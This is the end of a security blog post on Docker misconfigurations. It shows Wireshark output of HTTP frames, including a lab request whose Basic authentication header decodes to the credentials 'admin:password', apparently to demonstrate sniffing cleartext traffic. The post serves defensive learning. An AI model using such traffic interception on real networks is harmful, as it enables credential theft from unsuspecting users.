    Date: Sat, 07 Sep 2024 10:44:59 GMT\r\n
    Server: Apache/2.4.58 ()\r\n
    Upgrade: h2,h2c\r\n
    Connection: Upgrade\r\n
    Last-Modified: Wed, 29 Jun 2022 00:23:33 GMT\r\n
    ETag: "f79-5e28b29d38e93"\r\n
    Accept-Ranges: bytes\r\n
    Content-Length: 3961\r\n
        [Content length: 3961]
    Vary: Accept-Encoding\r\n
    Content-Type: text/html; charset=UTF-8\r\n
    \r\n
    [HTTP response 1/1]
    [Time since request: 0.094416000 seconds]
    [Request in frame: 45]
    [Request URI: http://neverssl.com/]
    File Data: 3961 bytes
Line-based text data: text/html (131 lines)

Frame 77: 184 bytes on wire (1472 bits), 184 bytes captured (1472 bits)
Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64)
Internet Protocol Version 4, Src: 10.211.55.18, Dst: 10.211.55.2
Transmission Control Protocol, Src Port: 37572, Dst Port: 80, Seq: 1, Ack: 1, Len: 118
Hypertext Transfer Protocol
    GET / HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
            [GET / HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /
        Request Version: HTTP/1.1
    Host: 10.211.55.2\r\n
    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n
        Credentials: admin:password
    User-Agent: curl/7.68.0\r\n
    Accept: */*\r\n
    \r\n
    [Full request URI: http://10.211.55.2/]
    [HTTP request 1/1]

Frame 82: 95 bytes on wire (760 bits), 95 bytes captured (760 bits)
Ethernet II, Src: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
Internet Protocol Version 4, Src: 10.211.55.2, Dst: 10.211.55.18
Transmission Control Protocol, Src Port: 80, Dst Port: 37572, Seq: 174, Ack: 119, Len: 29
[2 Reassembled TCP Segments (202 bytes): #80(173), #82(29)]
Hypertext Transfer Protocol
    HTTP/1.1 200 OK\r\n
        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
            [HTTP/1.1 200 OK\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Response Version: HTTP/1.1
        Status Code: 200
        [Status Code Description: OK]
        Response Phrase: OK
    Server: Werkzeug/3.0.1 Python/3.11.9\r\n
    Date: Sat, 07 Sep 2024 10:45:02 GMT\r\n
    Content-Type: text/html; charset=utf-8\r\n
    Content-Length: 29\r\n
        [Content length: 29]
    Connection: close\r\n
    \r\n
    [HTTP response 1/1]
    [Time since request: 0.005050000 seconds]
    [Request in frame: 77]
    [Request URI: http://10.211.55.2/]
    File Data: 29 bytes
Line-based text data: text/html (1 lines)
</code></pre></div></div>


  </div><a class="u-url" href="/2024/09/03/Exploring-Docker-Misconfigurations.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">halcyondream</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">halcyondream</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/halcyondream"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">halcyondream</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Portfolio for Cybersecurity projects, research, and developments.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
